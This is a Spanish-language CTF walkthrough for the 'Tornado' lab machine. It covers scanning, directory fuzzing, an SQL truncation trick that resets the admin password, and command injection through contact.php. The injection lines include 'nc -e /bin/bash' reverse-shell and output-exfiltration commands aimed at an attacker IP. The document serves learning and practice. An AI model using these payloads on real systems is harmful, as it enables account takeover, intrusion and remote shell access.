

### Parte practica - Maquina Tornado

arrancamos con un arp-scan
```sh
arp-scan -I <interfaz> --localnet --ignoredups
```

luego de obtener la dierccion ip aplicamos un fuzzeo rapido con [[gobuster]] con 20 hilos

```sh
gobuster dir -u http://<ip> -w <diccionario> -t 20
```

> generalmente para gobuster ocupamos de seclists/Discovery/web-content/directory-list etc.

hay una ruta que es `/bluesky/`  

de esa ruta miramoos si tene archivos con extension .php

```sh
gobuster dir -u http://<ip>/bluesky -w <diccionario> -t 20 -x php
```

 me da un login.php, que parece ser vulnerable y un `signup.php` 

lo curioso se encuentra en el signup que al momento de crear un usuario el input donde se pone el correo y la clave para registrarse te deja como maximo una longitud de 13 caracteres. A modo de prueba nos hacemos una cuenta y en el home del usuario creado aparece un mensaje diciendo que *el LFI se parcheó*. al momento de ver el codigo fuente con `ctrl + u` nos salta abajo una ruta de home de un usuario.

> [!IMPORTANT]
> El servidor web es un apache y la ruta que contenia ese codigo fuente era la de un usuario "tornado"

con eso en mente, si ponemos en la url
```http
http://localhost/~/tornado/
```
> recordar que `~/` hace referencia al /home/`$USER`/ 

pero si hacemos esto y tocamos en el arcivo de `/imp.txt` a algo como esto

![[Pasted image 20250509041206.png]]

lo que a mi me importa son esa lista de correos, y por que? porque con eso son lista de usuarios, como el ceo, el cto el manager, etc.

ahora la pregunta, ¿para que era lo de la longitud del sign up? aqui es donde vamos a jugar con eso, ya que desde el cliente podemos modificar esa longitud en el input la podemos elevar a algo mayor que 13

si en la pantalla del el `sign up`  queremos utilizar un correo como el del admin que es `admin@tornado` tiene 13 de longitud e intentamos registrarnos no vamos a poder porque esta registrado, pero si reemplazamos la longitud del input y ponemos algo como esto

```
email: admin@tornado  a

contraseña: hacked 
```
nota los espacios, y la a al final, lo que va a hacer el servidor lo va a procesar como un usuario nuevo pero en la consulta borrara todo lo que supere la longitud de 13 caracteres, o sea el `__a` 

dando como resultado `admin@tornado`, entonces si tu haces eso lograste cambiar la contraseña del `admin@tornado` a *hacked*.

ademas dentro del panel de admin hay una pestaña de contact que te lleva a un contact.php que aparentemente esta utilizando un `exec()` o algo por el estilo
donde se pueden ejecutar comandos de linux. pero el output no te deja ver desde la pagina asi que por mi maquina de atacante me pongo en escucha con netcat

```sh
nc -nlvp 443
```

y del lado de la victima puedo lanzarle un whoami y redireccionar la salida a la ip atacante por ese puerto

```sh
test; whoami | nc <ip> <port>
```

y definitivamente puedo ver ese output que es `www-data`

por lo que al final si hacemos
```sh
test; nc -e /bin/bash <ip> <port>
```

si quieres tratar la TTY haciendo

```sh
script /dev/null -c bash
```

y ya explotaste una SQL Truncation



como extra si cateamos el contact.php vemos un 

```php
$cmd=$_POST['comment'];
echo $cmd;
exec($cmd);
```

